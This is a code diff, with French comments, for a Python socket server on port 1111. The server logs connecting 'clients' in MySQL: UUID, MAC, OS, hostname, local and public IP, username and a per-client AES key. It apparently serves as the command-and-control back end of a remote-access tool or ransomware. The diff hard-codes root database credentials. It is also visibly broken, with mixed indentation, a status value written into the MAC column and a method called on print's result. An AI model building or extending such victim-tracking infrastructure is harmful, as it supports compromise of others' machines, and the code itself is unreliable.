@@ -7,6 +7,7 @@ import threading
 import MySQLdb
 from functions import check_alive
 from threading import Thread
+from functions import *
 import subprocess
 
 class ClientThread(threading.Thread):
@@ -29,7 +30,39 @@ class ClientThread(threading.Thread):
             pass
 
         if alive == True:
-            if "Init" in str(receive):
+	    if "Init" in str(receive):
+		infos = str(receive)
+                for items in infos.split(','):
+                    array_infos.append(items)
+                    # Incrémente les infos dans une liste
+
+		array_infos[0] = array_infos[0].replace("b'", "")
+                array_infos[-1] = array_infos[-1].replace("'", "")
+                # Formate les élements de la liste
+
+		uuid = str(array_infos[1])
+
+		db = MySQLdb.connect("localhost","root","toor","clients")
+                cursor = db.cursor()
+                # Init connexion à la BDD
+
+                cursor.execute( """SELECT uuid FROM clients.clients WHERE uuid = %s""", [uuid] )
+                rows = cursor.fetchall()
+                # Cherche doublons UUID avant ajout en BDD
+                if str(rows) == "()":
+			try:
+                                cursor.execute("""INSERT INTO clients.clients (last_alive,uuid,mac,aes_key) VALUE (%s,%s,%s,%s)""",(array_infos[0],array_infos[1],array_infos[2],'key'))
+                                db.commit()
+                                print("[+] Got a new client : " + str(array_infos))
+                        except:
+                                db.rollback()
+                                print("[-] Impossible d'ajouter le client dans le BDD")
+                        db.close()
+                else:
+                        print("[+] Client is back : " + str(rows)).replace("(('","")[:-5]
+                # Ajoute les informations clientes dans la base de données
+
+            if "Init2" in str(receive):
                 infos = str(receive)
                 for items in infos.split(','):
                     array_infos.append(items)
@@ -56,7 +89,7 @@ class ClientThread(threading.Thread):
 		# Cherche doublons UUID avant ajout en BDD
         	if str(rows) == "()":
                 	try:
-                        	cursor.execute("""INSERT INTO clients.clients (last_alive,uuid,os,computer,lip,user,pip,status) VALUES (%s,%s,%s,%s,%s,%s,%s,%s)""",(array_infos[0],array_infos[1],array_infos[2],array_infos[3],array_infos[4],array_infos[5],array_infos[6],'Alive'))
+                        	cursor.execute("""INSERT INTO clients.clients (last_alive,uuid,os,computer,lip,user,pip,mac) VALUES (%s,%s,%s,%s,%s,%s,%s,%s)""",(array_infos[0],array_infos[1],array_infos[2],array_infos[3],array_infos[4],array_infos[5],array_infos[6],'Alive'))
                         	db.commit()
                         	print("[+] Got a new client : " + str(array_infos))
 	                except:
@@ -105,6 +138,10 @@ class ClientThread(threading.Thread):
 
 	    elif str(receive) == "Exit":
 		pass
+	    elif "Init" in str(receive):
+		pass
+	    elif "Alive" in str(receive):
+                pass
             else:
                 print("[-] Incorrect message format : " + str(receive))
 
@@ -125,6 +162,8 @@ tcpsock.bind(("", 1111))
 
 is_down_thread = is_down()
 is_down_thread.start()
+
+check_aes_key()
 
 while True:
     	tcpsock.listen(10)
